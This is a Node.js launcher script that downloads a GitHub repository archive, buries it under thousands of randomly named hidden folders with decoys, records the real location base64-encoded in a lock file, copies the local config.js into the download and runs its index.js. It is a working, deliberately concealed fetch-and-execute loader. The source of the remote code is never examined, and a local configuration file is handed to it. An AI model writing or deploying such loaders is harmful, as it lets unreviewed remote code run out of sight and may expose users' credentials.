const fs = require('fs');
const path = require('path');
const axios = require('axios');
const AdmZip = require('adm-zip');
const crypto = require('crypto');

// Settings
const repoZipUrl = 'https://github.com/3strox/x/archive/refs/heads/main.zip';
const CACHE_FOLDER = path.join(__dirname, '.cache');
const LOCK_FILE = path.join(__dirname, '.lock');
const NUM_ROOTS = 100;
const NEST_DEPTH = 100;

// Utilities
const randomName = () => '.' + crypto.randomBytes(3).toString('hex');
const encode = (text) => Buffer.from(text).toString('base64');
const decode = (text) => Buffer.from(text, 'base64').toString('utf8');

// Create deep nested path
function createDeepPath(base, depth = 100) {
    let current = base;
    for (let i = 0; i < depth; i++) {
        const folder = randomName();
        current = path.join(current, folder);
        if (!fs.existsSync(current)) fs.mkdirSync(current);
    }
    return current;
}

// Download and extract GitHub zip
async function downloadAndExtractRepo(targetPath) {
    try {
        console.log('[🌐] Downloading repo...');
        const response = await axios.get(repoZipUrl, { responseType: 'arraybuffer' });
        const zip = new AdmZip(Buffer.from(response.data, 'binary'));
        zip.extractAllTo(targetPath, true);
        console.log('[✅] Repo extracted.');
    } catch (err) {
        console.error('❌ Could not extract repo:', err);
        process.exit(1);
    }
}

// MAIN
(async () => {
    let realPath;

    if (fs.existsSync(LOCK_FILE)) {
        // Use path from lock file
        realPath = decode(fs.readFileSync(LOCK_FILE, 'utf-8'));
        console.log('[🔐] Loaded hidden path from .lock');
    } else {
        if (!fs.existsSync(CACHE_FOLDER)) fs.mkdirSync(CACHE_FOLDER);

        const realIndex = Math.floor(Math.random() * NUM_ROOTS);

        for (let i = 0; i < NUM_ROOTS; i++) {
            const root = path.join(CACHE_FOLDER, randomName());
            fs.mkdirSync(root);

            const deep = createDeepPath(root, NEST_DEPTH);

            if (i === realIndex) {
                realPath = path.join(deep, '.repo');
                fs.mkdirSync(realPath, { recursive: true });
                await downloadAndExtractRepo(realPath);

                // Save encoded path in .lock
                fs.writeFileSync(LOCK_FILE, encode(realPath));
                console.log('[🔒] Path saved to .lock');
            } else {
                fs.writeFileSync(path.join(deep, '.dummy'), '⛔');
            }
        }
    }

    // Locate extracted folder
    const folder = fs.readdirSync(realPath).find(f =>
        fs.statSync(path.join(realPath, f)).isDirectory()
    );

    if (!folder) {
        console.error('❌ No extracted folder found.');
        process.exit(1);
    }

    const extracted = path.join(realPath, folder);

    // Inject config
    const configPath = path.join(__dirname, 'config.js');
    if (fs.existsSync(configPath)) {
        fs.copyFileSync(configPath, path.join(extracted, 'config.js'));
    }

    console.log('[🚀] Running from deep secure folder...');
    process.chdir(extracted);
    require(path.join(extracted, 'index.js'));
})();
